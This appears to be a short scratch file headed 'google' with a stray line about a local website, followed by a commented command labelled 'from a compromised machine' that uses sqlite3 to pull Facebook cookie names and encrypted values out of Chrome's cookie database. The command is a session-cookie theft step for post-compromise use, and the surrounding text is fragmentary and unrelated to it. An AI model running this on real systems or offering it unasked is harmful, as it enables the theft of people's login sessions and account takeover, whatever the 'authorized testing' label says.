# google
localwebsite for new try
# From a compromised machine (authorized testing only)
# Chrome: Extract cookies
sqlite3 ~/.config/google-chrome/Default/Cookies "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook%'"
